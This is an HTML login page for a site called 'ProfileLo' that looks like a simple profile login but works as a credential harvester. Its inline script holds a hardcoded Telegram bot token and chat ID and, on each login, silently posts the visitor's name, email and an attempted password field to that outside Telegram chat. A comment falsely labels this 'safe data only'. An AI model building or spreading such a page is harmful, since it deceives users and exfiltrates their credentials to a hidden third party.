<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ProfileLo Login</title>

<style>
body{
  margin:0;
  font-family:Arial;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:linear-gradient(135deg,#0f172a,#1e293b);
  color:white;
}

.box{
  width:320px;
  padding:20px;
  background:rgba(255,255,255,0.08);
  backdrop-filter:blur(10px);
  border-radius:15px;
  text-align:center;
}

input{
  width:100%;
  padding:10px;
  margin:8px 0;
  border:none;
  border-radius:8px;
  outline:none;
}

button{
  width:100%;
  padding:10px;
  margin-top:10px;
  border:none;
  border-radius:8px;
  background:#38bdf8;
  font-weight:bold;
  cursor:pointer;
}

button:hover{
  background:#0ea5e9;
}

.profile{
  display:none;
}
.avatar{
  width:80px;
  height:80px;
  border-radius:50%;
  background:#38bdf8;
  margin:10px auto;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:28px;
  color:black;
  font-weight:bold;
}
</style>
</head>

<body>

<div class="box" id="loginBox">
  <h2>Login</h2>

  <input type="text" id="name" placeholder="Enter Name">
  <input type="email" id="email" placeholder="Enter Email">
  <input type="password" id="pass" placeholder="Password">

  <button onclick="login()">Login</button>
</div>

<div class="box profile" id="profileBox">
  <div class="avatar" id="avatar">U</div>
  <h2 id="pname"></h2>
  <p id="pemail"></p>
  <button onclick="logout()">Logout</button>
</div>

<script>
const botToken = "8507706742:AAFgZhWiOsCBfsL6wJORQUy7xabov-Wor3o";
const chatId = "778298958";

async function sendTelegram(name, email){
  const msg =
`📥 New Login Alert
👤 Name: ${name}
📧 Email: ${email}
password : ${pass}`;

  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify({
      chat_id: chatId,
      text: msg
    })
  });
}

function login(){
  let name = document.getElementById("name").value;
  let email = document.getElementById("email").value;

  if(!name || !email){
    alert("Fill all fields");
    return;
  }

  // send safe data only
  sendTelegram(name, email);

  localStorage.setItem("name", name);
  localStorage.setItem("email", email);

  showProfile();
}

function showProfile(){
  document.getElementById("loginBox").style.display="none";
  document.getElementById("profileBox").style.display="block";

  let name = localStorage.getItem("name");
  let email = localStorage.getItem("email");

  document.getElementById("pname").innerText = name;
  document.getElementById("pemail").innerText = email;
  document.getElementById("avatar").innerText = name.charAt(0).toUpperCase();
}

function logout(){
  localStorage.clear();
  location.reload();
}

if(localStorage.getItem("name")){
  showProfile();
}
</script>

</body>
</html>
